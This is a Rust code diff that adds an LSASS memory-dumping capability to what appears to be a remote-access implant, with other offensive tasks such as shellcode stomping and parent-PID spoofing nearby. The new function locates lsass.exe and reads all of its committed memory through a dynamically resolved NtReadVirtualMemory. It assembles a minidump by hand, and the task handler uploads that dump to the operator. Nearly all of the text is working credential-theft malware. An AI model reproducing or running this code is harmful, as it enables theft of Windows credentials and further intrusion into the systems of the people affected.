@@ -328,6 +328,189 @@ use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
 };
 
+// ── LSASS_DUMP_NT ─────────────────────────────────────────────────────────────
+
+#[cfg(target_os = "windows")]
+unsafe fn lsass_dump_nt(lsas_pid: u32) -> Vec<u8> {
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Module32First, Module32Next, MODULEENTRY32, TH32CS_SNAPMODULE,
+        Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
+    };
+    use windows_sys::Win32::System::Threading::PROCESS_VM_READ;
+    use windows_sys::Win32::System::Memory::{VirtualQueryEx, MEMORY_BASIC_INFORMATION, MEM_COMMIT};
+    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+
+    let mut pid = lsas_pid;
+    if pid == 0 {
+        let snap0 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap0 != -1 {
+            let mut pe: PROCESSENTRY32 = std::mem::zeroed();
+            pe.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
+            if Process32First(snap0, &mut pe) != 0 {
+                loop {
+                    let name = pe.szExeFile.iter().take_while(|&&c| c != 0)
+                        .map(|&c| (c as u8) as char).collect::<String>().to_lowercase();
+                    if name == "lsass.exe" { pid = pe.th32ProcessID; break; }
+                    if Process32Next(snap0, &mut pe) == 0 { break; }
+                }
+            }
+            CloseHandle(snap0);
+        }
+    }
+    if pid == 0 { return Vec::new(); }
+
+    let hproc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid);
+    if hproc == 0 { return Vec::new(); }
+    // RAII close via drop at end
+    struct Handle(windows_sys::Win32::Foundation::HANDLE);
+    impl Drop for Handle { fn drop(&mut self) { unsafe { CloseHandle(self.0); } } }
+    let _hproc_guard = Handle(hproc);
+
+    // NtReadVirtualMemory via GetProcAddress
+    type NtReadVM = unsafe extern "system" fn(HANDLE: isize, Base: *const u8, Buf: *mut u8,
+                                              Sz: usize, Nr: *mut usize) -> i32;
+    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+    if ntdll == 0 { return Vec::new(); }
+    let nt_read_raw = GetProcAddress(ntdll, b"NtReadVirtualMemory\0".as_ptr());
+    if nt_read_raw.is_none() { return Vec::new(); }
+    let nt_read: NtReadVM = std::mem::transmute(nt_read_raw.unwrap());
+
+    // Module enumeration
+    struct ModInfo { base: u64, size: u32, name: Vec<u8> }
+    let mut mods: Vec<ModInfo> = Vec::new();
+    let snap1 = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if snap1 != -1 {
+        let mut me: MODULEENTRY32 = std::mem::zeroed();
+        me.dwSize = std::mem::size_of::<MODULEENTRY32>() as u32;
+        if Module32First(snap1, &mut me) != 0 {
+            loop {
+                let name_bytes: Vec<u8> = me.szModule.iter().take_while(|&&c| c != 0)
+                    .map(|&c| c as u8).collect();
+                // UTF-16 LE encoding for MINIDUMP_STRING
+                let mut utf16: Vec<u8> = Vec::new();
+                for c in name_bytes.iter() { utf16.push(*c); utf16.push(0); }
+                utf16.push(0); utf16.push(0); // null terminator
+                mods.push(ModInfo { base: me.modBaseAddr as u64, size: me.modBaseSize, name: utf16 });
+                if Module32Next(snap1, &mut me) == 0 { break; }
+            }
+        }
+        CloseHandle(snap1);
+    }
+
+    // Memory enumeration via VirtualQueryEx + NtReadVirtualMemory
+    struct MemReg { addr: u64, raw: Vec<u8> }
+    let mut regs: Vec<MemReg> = Vec::new();
+    let mut cur: usize = 0;
+    loop {
+        let mut mbi: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+        let r = VirtualQueryEx(hproc, cur as *const _, &mut mbi, std::mem::size_of_val(&mbi));
+        if r == 0 { break; }
+        if mbi.State == MEM_COMMIT {
+            let mut rbuf = vec![0u8; mbi.RegionSize];
+            let mut n_read: usize = 0;
+            nt_read(hproc, mbi.BaseAddress as *const u8,
+                    rbuf.as_mut_ptr(), mbi.RegionSize, &mut n_read);
+            if n_read > 0 {
+                rbuf.truncate(n_read);
+                regs.push(MemReg { addr: mbi.BaseAddress as u64, raw: rbuf });
+            }
+        }
+        let next = mbi.BaseAddress as usize + mbi.RegionSize;
+        if next <= cur { break; }
+        cur = next;
+    }
+
+    // Build MDMP
+    const MOD_ENT_SZ: usize = 108;
+    const SYS_INFO_SZ: usize = 56;
+    const NUM_STREAMS: u32   = 3;
+
+    let dir_off      = 32usize;
+    let sys_info_off = dir_off + 3 * 12;           // 68
+    let mod_list_off = sys_info_off + SYS_INFO_SZ; // 124
+    let mod_entries_end = mod_list_off + 4 + mods.len() * MOD_ENT_SZ;
+
+    // compute name blob offsets
+    struct NameBlob { rva: usize, blob: Vec<u8> }
+    let mut names: Vec<NameBlob> = Vec::new();
+    let mut name_off = mod_entries_end;
+    for m in &mods {
+        // m.name is already UTF-16 LE with null; blob = ULONG32(len excl null) + UTF-16
+        let char_len = m.name.len() - 2; // exclude null terminator bytes
+        let mut blob = Vec::with_capacity(4 + m.name.len());
+        blob.extend_from_slice(&(char_len as u32).to_le_bytes());
+        blob.extend_from_slice(&m.name);
+        names.push(NameBlob { rva: name_off, blob: blob.clone() });
+        name_off += blob.len();
+    }
+
+    let mem64_off     = name_off;
+    let mem64_hdr_len = 8 + 8 + regs.len() * 16;
+    let data_off      = mem64_off + mem64_hdr_len;
+    let total_data: usize = regs.iter().map(|r| r.raw.len()).sum();
+    let total_len = data_off + total_data;
+
+    let mut buf = vec![0u8; total_len];
+
+    macro_rules! pu32 { ($off:expr, $v:expr) => { buf[$off..$off+4].copy_from_slice(&($v as u32).to_le_bytes()); } }
+    macro_rules! pu64 { ($off:expr, $v:expr) => { buf[$off..$off+8].copy_from_slice(&($v as u64).to_le_bytes()); } }
+    macro_rules! pu16 { ($off:expr, $v:expr) => { buf[$off..$off+2].copy_from_slice(&($v as u16).to_le_bytes()); } }
+
+    // MINIDUMP_HEADER
+    pu32!(0,  0x504d444du32);
+    pu32!(4,  0x0000a793u32);
+    pu32!(8,  NUM_STREAMS);
+    pu32!(12, dir_off as u32);
+    pu32!(20, std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_secs() as u32);
+    pu64!(24, 2u64);
+
+    // Directories
+    pu32!(dir_off,     7u32); pu32!(dir_off+4,  SYS_INFO_SZ as u32); pu32!(dir_off+8,  sys_info_off as u32);
+    pu32!(dir_off+12,  4u32); pu32!(dir_off+16, (mem64_off - mod_list_off) as u32); pu32!(dir_off+20, mod_list_off as u32);
+    pu32!(dir_off+24,  9u32); pu32!(dir_off+28, mem64_hdr_len as u32); pu32!(dir_off+32, mem64_off as u32);
+
+    // SystemInfo
+    let s = sys_info_off;
+    pu16!(s,    9u16);    // PROCESSOR_ARCHITECTURE_AMD64
+    pu16!(s+2,  6u16);    // ProcessorLevel
+    buf[s+6] = 1;          // NumberOfProcessors
+    buf[s+7] = 1;          // ProductType
+    pu32!(s+8,  10u32);   // MajorVersion
+    pu32!(s+16, 19041u32); // BuildNumber
+    pu32!(s+20, 2u32);     // PlatformId
+
+    // ModuleList
+    pu32!(mod_list_off, mods.len() as u32);
+    for (i, (m, nb)) in mods.iter().zip(names.iter()).enumerate() {
+        let e = mod_list_off + 4 + i * MOD_ENT_SZ;
+        pu64!(e,    m.base);
+        pu32!(e+8,  m.size);
+        pu32!(e+20, nb.rva as u32);
+    }
+    for nb in &names {
+        buf[nb.rva..nb.rva+nb.blob.len()].copy_from_slice(&nb.blob);
+    }
+
+    // Memory64List
+    pu64!(mem64_off,   regs.len() as u64);
+    pu64!(mem64_off+8, data_off as u64);
+    for (i, r) in regs.iter().enumerate() {
+        let e = mem64_off + 16 + i * 16;
+        pu64!(e,   r.addr);
+        pu64!(e+8, r.raw.len() as u64);
+    }
+
+    // Raw data
+    let mut pos = data_off;
+    for r in &regs {
+        buf[pos..pos+r.raw.len()].copy_from_slice(&r.raw);
+        pos += r.raw.len();
+    }
+
+    buf
+}
+
 // ── SHELLCODE_STOMP ───────────────────────────────────────────────────────────
 
 #[cfg(target_os = "windows")]
@@ -1345,6 +1528,19 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 t.send_result(task.id, &out, "");
             }
         }
+        #[cfg(target_os = "windows")]
+        "LSASS_DUMP_NT" => {
+            let lsas_pid: u32 = task.args.trim().parse().unwrap_or(0);
+            let data = unsafe { lsass_dump_nt(lsas_pid) };
+            if data.is_empty() {
+                t.send_result(task.id, "", "lsass_dump_nt: dump failed (need admin?)");
+            } else {
+                let n = data.len();
+                t.upload_file(task.id, "lsass_nt.dmp", &data);
+                t.send_result(task.id, &format!("[+] lsass NT dump: {} bytes", n), "");
+            }
+        }
+
         #[cfg(target_os = "windows")]
         "PPID" => {
             let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
